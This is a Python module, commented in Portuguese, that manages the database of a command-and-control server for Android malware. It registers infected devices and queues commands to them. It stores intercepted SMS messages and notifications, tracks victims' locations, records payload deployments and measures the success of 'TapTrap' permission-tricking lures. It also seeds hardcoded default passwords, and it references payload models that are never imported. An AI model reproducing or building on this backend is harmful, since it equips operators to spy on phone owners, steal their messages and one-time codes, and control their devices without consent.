"""
Gerenciador de banco de dados SQLAlchemy para sistema C2
"""

from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from sqlalchemy import text, create_engine, inspect
from sqlalchemy.exc import IntegrityError, SQLAlchemyError
from datetime import datetime, timedelta
import logging
import json
import os

from .models import (
    db, User, UserSession, Device, Command,
    DeviceLog, SmsMessage, NotificationData, LocationData, TapTrapEvent,
    FileTransfer, SystemStats, SystemEvent
)

class DatabaseManager:
    """Gerenciador principal do banco de dados"""
    
    def __init__(self, app=None):
        self.db = db
        self.migrate = None
        self.logger = logging.getLogger(__name__)
        
        if app:
            self.init_app(app)
    
    def init_app(self, app):
        """Inicializa banco com aplicação Flask"""
        
        # Configurar SQLAlchemy
        database_url = app.config.get('DATABASE_URL', 'sqlite:///malware_c2.db')
        app.config['SQLALCHEMY_DATABASE_URI'] = database_url
        app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
        app.config['SQLALCHEMY_ECHO'] = app.config.get('DEBUG', False)
        
        # Inicializar extensões
        self.db.init_app(app)
        self.migrate = Migrate(app, self.db)
        
        # Criar diretório de banco se necessário
        if database_url.startswith('sqlite:///'):
            db_path = database_url.replace('sqlite:///', '')
            db_dir = os.path.dirname(os.path.abspath(db_path))
            os.makedirs(db_dir, exist_ok=True)
        
        self.logger.info(f"Banco de dados configurado: {database_url}")
    
    def create_tables(self):
        """Cria todas as tabelas"""
        try:
            self.db.create_all()
            self.logger.info("Tabelas criadas com sucesso")
            return True
        except Exception as e:
            self.logger.error(f"Erro ao criar tabelas: {e}")
            return False
    
    def drop_tables(self):
        """Remove todas as tabelas (CUIDADO!)"""
        try:
            self.db.drop_all()
            self.logger.warning("Todas as tabelas foram removidas")
            return True
        except Exception as e:
            self.logger.error(f"Erro ao remover tabelas: {e}")
            return False
    
    def reset_database(self):
        """Reseta banco de dados completamente"""
        try:
            self.drop_tables()
            self.create_tables()
            self.create_default_data()
            self.logger.info("Banco de dados resetado com sucesso")
            return True
        except Exception as e:
            self.logger.error(f"Erro ao resetar banco: {e}")
            return False
    
    def create_default_data(self):
        """Cria dados padrão do sistema"""
        try:
            # Criar usuário admin se não existir
            admin_user = User.query.filter_by(username='admin').first()
            if not admin_user:
                admin_user = User(
                    username='admin',
                    email='admin@malware-c2.local',
                    role='admin'
                )
                admin_user.set_password('admin123')
                self.db.session.add(admin_user)
            
            # Criar usuário operador
            operator_user = User.query.filter_by(username='operator').first()
            if not operator_user:
                operator_user = User(
                    username='operator',
                    email='operator@malware-c2.local',
                    role='operator'
                )
                operator_user.set_password('operator123')
                self.db.session.add(operator_user)
            
            # Criar estatísticas iniciais
            stats = SystemStats.query.first()
            if not stats:
                stats = SystemStats()
                self.db.session.add(stats)
            
            # Evento de inicialização
            init_event = SystemEvent(
                event_type='system_startup',
                event_category='system',
                message='Sistema C2 inicializado com sucesso',
                severity='info'
            )
            self.db.session.add(init_event)
            
            self.db.session.commit()
            self.logger.info("Dados padrão criados")
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao criar dados padrão: {e}")
            raise
    
    # ================ DEVICE OPERATIONS ================
    
    def register_device(self, device_data):
        """Registra novo dispositivo"""
        try:
            # Verificar se dispositivo já existe
            existing_device = Device.query.filter_by(device_id=device_data['device_id']).first()
            
            if existing_device:
                # Atualizar dispositivo existente
                existing_device.status = 'online'
                existing_device.last_seen = datetime.utcnow()
                existing_device.ip_address = device_data.get('ip_address')
                existing_device.app_version = device_data.get('app_version')
                
                self.db.session.commit()
                self.logger.info(f"Dispositivo atualizado: {device_data['device_id']}")
                return existing_device
            
            # Criar novo dispositivo
            device = Device(
                device_id=device_data['device_id'],
                device_name=device_data.get('device_name'),
                model=device_data.get('model'),
                manufacturer=device_data.get('manufacturer'),
                android_version=device_data.get('android_version'),
                api_level=device_data.get('api_level'),
                app_version=device_data.get('app_version'),
                ip_address=device_data.get('ip_address'),
                status='online'
            )
            
            self.db.session.add(device)
            self.db.session.commit()
            
            self.logger.info(f"Novo dispositivo registrado: {device_data['device_id']}")
            return device
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao registrar dispositivo: {e}")
            raise
    
    def update_device_status(self, device_id, status, additional_data=None):
        """Atualiza status do dispositivo"""
        try:
            device = Device.query.filter_by(device_id=device_id).first()
            if not device:
                self.logger.warning(f"Dispositivo não encontrado: {device_id}")
                return None
            
            device.status = status
            device.last_seen = datetime.utcnow()
            
            if additional_data:
                if 'battery_level' in additional_data:
                    device.battery_level = additional_data['battery_level']
                if 'is_charging' in additional_data:
                    device.is_charging = additional_data['is_charging']
                if 'latitude' in additional_data and 'longitude' in additional_data:
                    device.latitude = additional_data['latitude']
                    device.longitude = additional_data['longitude']
                    device.location_timestamp = datetime.utcnow()
            
            self.db.session.commit()
            return device
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao atualizar dispositivo: {e}")
            raise
    
    def get_devices(self, status=None, limit=None):
        """Recupera lista de dispositivos"""
        try:
            query = Device.query
            
            if status:
                query = query.filter_by(status=status)
            
            if limit:
                query = query.limit(limit)
            
            return query.order_by(Device.last_seen.desc()).all()
            
        except Exception as e:
            self.logger.error(f"Erro ao recuperar dispositivos: {e}")
            return []
    
    def delete_device(self, device_id):
        """Remove dispositivo e dados relacionados"""
        try:
            device = Device.query.filter_by(device_id=device_id).first()
            if not device:
                return False
            
            self.db.session.delete(device)
            self.db.session.commit()
            
            self.logger.info(f"Dispositivo removido: {device_id}")
            return True
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao remover dispositivo: {e}")
            return False
    
    # ================ COMMAND OPERATIONS ================
    
    def create_command(self, device_id, command_type, command_data, created_by=None, priority='normal'):
        """Cria novo comando"""
        try:
            device = Device.query.filter_by(device_id=device_id).first()
            if not device:
                raise ValueError(f"Dispositivo não encontrado: {device_id}")
            
            command = Command(
                device_id=device.id,
                command_type=command_type,
                command_data=command_data,
                priority=priority,
                created_by=created_by
            )
            
            self.db.session.add(command)
            self.db.session.commit()
            
            self.logger.info(f"Comando criado: {command.command_id}")
            return command
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao criar comando: {e}")
            raise
    
    def update_command_status(self, command_id, status, result=None, error_message=None):
        """Atualiza status do comando"""
        try:
            command = Command.query.filter_by(command_id=command_id).first()
            if not command:
                self.logger.warning(f"Comando não encontrado: {command_id}")
                return None
            
            command.status = status
            
            if status == 'sent':
                command.sent_at = datetime.utcnow()
            elif status == 'executed':
                command.executed_at = datetime.utcnow()
                command.result = result
            elif status == 'failed':
                command.error_message = error_message
                command.retries += 1
            
            self.db.session.commit()
            return command
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao atualizar comando: {e}")
            raise
    
    def get_pending_commands(self, device_id=None):
        """Recupera comandos pendentes"""
        try:
            query = Command.query.filter_by(status='pending')
            
            if device_id:
                device = Device.query.filter_by(device_id=device_id).first()
                if device:
                    query = query.filter_by(device_id=device.id)
            
            return query.order_by(Command.created_at.asc()).all()
            
        except Exception as e:
            self.logger.error(f"Erro ao recuperar comandos pendentes: {e}")
            return []
    
    # ================ PAYLOAD OPERATIONS ================
    
    def store_payload(self, payload_data):
        """Armazena novo payload"""
        try:
            payload = Payload(
                name=payload_data['name'],
                description=payload_data.get('description'),
                filename=payload_data['filename'],
                filepath=payload_data['filepath'],
                file_type=payload_data['file_type'],
                file_hash=payload_data['file_hash'],
                file_size=payload_data['file_size'],
                version=payload_data.get('version', '1.0'),
                created_by=payload_data.get('created_by')
            )
            
            self.db.session.add(payload)
            self.db.session.commit()
            
            self.logger.info(f"Payload armazenado: {payload.name}")
            return payload
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao armazenar payload: {e}")
            raise
    
    def deploy_payload(self, payload_id, device_id, method='direct'):
        """Registra deployment de payload"""
        try:
            deployment = PayloadDeployment(
                payload_id=payload_id,
                device_id=device_id,
                method=method
            )
            
            self.db.session.add(deployment)
            self.db.session.commit()
            
            return deployment
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao registrar deployment: {e}")
            raise
    
    # ================ LOGGING OPERATIONS ================
    
    def log_device_event(self, device_id, log_type, category, message, details=None, severity='info'):
        """Registra evento do dispositivo"""
        try:
            device = Device.query.filter_by(device_id=device_id).first()
            if not device:
                self.logger.warning(f"Dispositivo não encontrado para log: {device_id}")
                return None
            
            log_entry = DeviceLog(
                device_id=device.id,
                log_type=log_type,
                category=category,
                message=message,
                details=details,
                severity=severity
            )
            
            self.db.session.add(log_entry)
            self.db.session.commit()
            
            return log_entry
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao registrar log: {e}")
            raise
    
    def log_system_event(self, event_type, category, message, details=None, user_id=None, severity='info'):
        """Registra evento do sistema"""
        try:
            event = SystemEvent(
                event_type=event_type,
                event_category=category,
                message=message,
                details=details,
                user_id=user_id,
                severity=severity
            )
            
            self.db.session.add(event)
            self.db.session.commit()
            
            return event
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao registrar evento do sistema: {e}")
            raise
    
    # ================ SMS OPERATIONS ================
    
    def store_sms_message(self, device_id, sms_data):
        """Armazena mensagem SMS interceptada"""
        try:
            device = Device.query.filter_by(device_id=device_id).first()
            if not device:
                raise ValueError(f"Dispositivo não encontrado: {device_id}")
            
            sms = SmsMessage(
                device_id=device.id,
                message_type=sms_data['message_type'],
                phone_number=sms_data['phone_number'],
                message_body=sms_data['message_body'],
                sms_timestamp=datetime.fromtimestamp(sms_data.get('timestamp', datetime.utcnow().timestamp())),
                is_command=sms_data.get('is_command', False),
                command_type=sms_data.get('command_type')
            )
            
            self.db.session.add(sms)
            self.db.session.commit()
            
            self.logger.info(f"SMS armazenado para dispositivo {device_id}")
            return sms
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao armazenar SMS: {e}")
            raise
    
    def get_sms_messages(self, device_id=None, limit=100):
        """Recupera mensagens SMS"""
        try:
            query = SmsMessage.query
            
            if device_id:
                device = Device.query.filter_by(device_id=device_id).first()
                if device:
                    query = query.filter_by(device_id=device.id)
            
            return query.order_by(SmsMessage.sms_timestamp.desc()).limit(limit).all()
            
        except Exception as e:
            self.logger.error(f"Erro ao recuperar SMS: {e}")
            return []
    
    # ================ NOTIFICATION OPERATIONS ================
    
    def store_notification(self, device_id, notification_data):
        """Armazena notificação interceptada"""
        try:
            device = Device.query.filter_by(device_id=device_id).first()
            if not device:
                raise ValueError(f"Dispositivo não encontrado: {device_id}")
            
            notification = NotificationData(
                device_id=device.id,
                package_name=notification_data['package_name'],
                app_name=notification_data.get('app_name'),
                title=notification_data.get('title'),
                text=notification_data.get('text'),
                posted_timestamp=datetime.fromtimestamp(
                    notification_data.get('timestamp', datetime.utcnow().timestamp())
                ),
                is_important=notification_data.get('is_important', False),
                contains_sensitive=notification_data.get('contains_sensitive', False)
            )
            
            self.db.session.add(notification)
            self.db.session.commit()
            
            return notification
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao armazenar notificação: {e}")
            raise
    
    # ================ LOCATION OPERATIONS ================
    
    def store_location(self, device_id, location_data):
        """Armazena dados de localização"""
        try:
            device = Device.query.filter_by(device_id=device_id).first()
            if not device:
                raise ValueError(f"Dispositivo não encontrado: {device_id}")
            
            location = LocationData(
                device_id=device.id,
                latitude=location_data['latitude'],
                longitude=location_data['longitude'],
                altitude=location_data.get('altitude'),
                accuracy=location_data.get('accuracy'),
                speed=location_data.get('speed'),
                provider=location_data.get('provider'),
                location_timestamp=datetime.fromtimestamp(
                    location_data.get('timestamp', datetime.utcnow().timestamp())
                )
            )
            
            # Calcular distância da última localização
            last_location = LocationData.query.filter_by(device_id=device.id)\
                .order_by(LocationData.location_timestamp.desc()).first()
            
            if last_location:
                distance = self.calculate_distance(
                    last_location.latitude, last_location.longitude,
                    location.latitude, location.longitude
                )
                location.distance_from_last = distance
                location.is_significant_move = distance > 50  # 50 metros
            
            self.db.session.add(location)
            self.db.session.commit()
            
            return location
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao armazenar localização: {e}")
            raise
    
    # ================ TAPTRAP OPERATIONS ================
    
    def log_taptrap_event(self, device_id, event_data):
        """Registra evento TapTrap"""
        try:
            device = Device.query.filter_by(device_id=device_id).first()
            if not device:
                raise ValueError(f"Dispositivo não encontrado: {device_id}")
            
            taptrap_event = TapTrapEvent(
                device_id=device.id,
                permission_type=event_data['permission_type'],
                permission_name=event_data['permission_name'],
                animation_used=event_data.get('animation_used'),
                status=event_data['status'],
                attempt_number=event_data.get('attempt_number', 1),
                response_time=event_data.get('response_time'),
                user_action=event_data.get('user_action'),
                lure_message=event_data.get('lure_message'),
                device_model=event_data.get('device_model'),
                android_version=event_data.get('android_version'),
                animation_duration=event_data.get('animation_duration')
            )
            
            if event_data['status'] in ['granted', 'denied', 'timeout']:
                taptrap_event.completed_at = datetime.utcnow()
            
            self.db.session.add(taptrap_event)
            self.db.session.commit()
            
            # Atualizar estatísticas
            self.update_taptrap_stats(event_data['status'])
            
            return taptrap_event
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao registrar evento TapTrap: {e}")
            raise
    
    def update_taptrap_stats(self, status):
        """Atualiza estatísticas TapTrap"""
        try:
            stats = SystemStats.query.first()
            if not stats:
                stats = SystemStats()
                self.db.session.add(stats)
            
            stats.taptrap_attempts += 1
            
            if status == 'granted':
                stats.taptrap_successes += 1
            
            if stats.taptrap_attempts > 0:
                stats.taptrap_success_rate = (stats.taptrap_successes / stats.taptrap_attempts) * 100
            
            self.db.session.commit()
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro ao atualizar estatísticas TapTrap: {e}")
    
    # ================ ANALYTICS AND STATS ================
    
    def get_dashboard_stats(self):
        """Recupera estatísticas para dashboard"""
        try:
            stats = {}
            
            # Dispositivos
            stats['total_devices'] = Device.query.count()
            stats['online_devices'] = Device.query.filter_by(status='online').count()
            stats['offline_devices'] = Device.query.filter_by(status='offline').count()
            
            # Comandos
            stats['total_commands'] = Command.query.count()
            stats['pending_commands'] = Command.query.filter_by(status='pending').count()
            stats['executed_commands'] = Command.query.filter_by(status='executed').count()
            
            # TapTrap
            stats['taptrap_total_attempts'] = TapTrapEvent.query.count()
            stats['taptrap_successes'] = TapTrapEvent.query.filter_by(status='granted').count()
            stats['taptrap_success_rate'] = (stats['taptrap_successes'] / max(stats['taptrap_total_attempts'], 1)) * 100
            
            # Dados coletados
            stats['total_sms'] = SmsMessage.query.count()
            stats['total_notifications'] = NotificationData.query.count()
            stats['total_locations'] = LocationData.query.count()
            
            # Atividade recente (últimas 24h)
            yesterday = datetime.utcnow() - timedelta(days=1)
            stats['recent_devices'] = Device.query.filter(Device.last_seen >= yesterday).count()
            stats['recent_commands'] = Command.query.filter(Command.created_at >= yesterday).count()
            stats['recent_sms'] = SmsMessage.query.filter(SmsMessage.intercepted_at >= yesterday).count()
            
            return stats
            
        except Exception as e:
            self.logger.error(f"Erro ao gerar estatísticas: {e}")
            return {}
    
    # ================ UTILITY METHODS ================
    
    def calculate_distance(self, lat1, lon1, lat2, lon2):
        """Calcula distância entre duas coordenadas (Haversine)"""
        import math
        
        R = 6371000  # Raio da Terra em metros
        
        lat1_rad = math.radians(lat1)
        lat2_rad = math.radians(lat2)
        delta_lat = math.radians(lat2 - lat1)
        delta_lon = math.radians(lon2 - lon1)
        
        a = (math.sin(delta_lat / 2) * math.sin(delta_lat / 2) +
             math.cos(lat1_rad) * math.cos(lat2_rad) *
             math.sin(delta_lon / 2) * math.sin(delta_lon / 2))
        
        c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
        
        return R * c  # Distância em metros
    
    def cleanup_old_data(self, days=30):
        """Limpa dados antigos"""
        try:
            cutoff_date = datetime.utcnow() - timedelta(days=days)
            
            # Remover logs antigos
            old_logs = DeviceLog.query.filter(DeviceLog.timestamp < cutoff_date).count()
            DeviceLog.query.filter(DeviceLog.timestamp < cutoff_date).delete()
            
            # Remover comandos executados antigos
            old_commands = Command.query.filter(
                Command.executed_at < cutoff_date,
                Command.status == 'executed'
            ).count()
            Command.query.filter(
                Command.executed_at < cutoff_date,
                Command.status == 'executed'
            ).delete()
            
            # Remover eventos TapTrap antigos
            old_taptrap = TapTrapEvent.query.filter(TapTrapEvent.started_at < cutoff_date).count()
            TapTrapEvent.query.filter(TapTrapEvent.started_at < cutoff_date).delete()
            
            self.db.session.commit()
            
            self.logger.info(f"Limpeza concluída: {old_logs} logs, {old_commands} comandos, {old_taptrap} eventos TapTrap removidos")
            
        except Exception as e:
            self.db.session.rollback()
            self.logger.error(f"Erro na limpeza de dados: {e}")
            raise
    
    def export_data(self, export_type='json', filters=None):
        """Exporta dados do banco"""
        try:
            data = {}
            
            if not filters or 'devices' in filters:
                data['devices'] = [device.to_dict() for device in Device.query.all()]
            
            if not filters or 'commands' in filters:
                data['commands'] = [cmd.to_dict() for cmd in Command.query.all()]
            
            if not filters or 'sms' in filters:
                data['sms_messages'] = [sms.to_dict() for sms in SmsMessage.query.all()]
            
            if not filters or 'notifications' in filters:
                data['notifications'] = [notif.to_dict() for notif in NotificationData.query.all()]
            
            if not filters or 'locations' in filters:
                data['locations'] = [loc.to_dict() for loc in LocationData.query.all()]
            
            if not filters or 'taptrap' in filters:
                data['taptrap_events'] = [event.to_dict() for event in TapTrapEvent.query.all()]
            
            return data
            
        except Exception as e:
            self.logger.error(f"Erro ao exportar dados: {e}")
            raise
    
    def get_health_status(self):
        """Verifica saúde do banco de dados"""
        try:
            # Testar conexão
            self.db.session.execute(text('SELECT 1'))
            
            # Verificar tabelas
            inspector = inspect(self.db.engine)
            tables = inspector.get_table_names()
            
            # Contar registros
            stats = {
                'database_connected': True,
                'tables_count': len(tables),
                'tables': tables,
                'total_devices': Device.query.count(),
                'total_commands': Command.query.count(),
                'total_payloads': 0,
                'total_logs': DeviceLog.query.count(),
                'database_size': self.get_database_size()
            }
            
            return stats
            
        except Exception as e:
            self.logger.error(f"Erro ao verificar saúde do banco: {e}")
            return {'database_connected': False, 'error': str(e)}
    
    def get_database_size(self):
        """Retorna tamanho do banco de dados"""
        try:
            # Para SQLite
            if 'sqlite' in str(self.db.engine.url):
                db_path = str(self.db.engine.url).replace('sqlite:///', '')
                if os.path.exists(db_path):
                    size_bytes = os.path.getsize(db_path)
                    return f"{size_bytes / (1024*1024):.2f} MB"
            
            return "N/A"
            
        except Exception as e:
            self.logger.error(f"Erro ao calcular tamanho do banco: {e}")
            return "Error"

# Instância global do gerenciador
database_manager = DatabaseManager()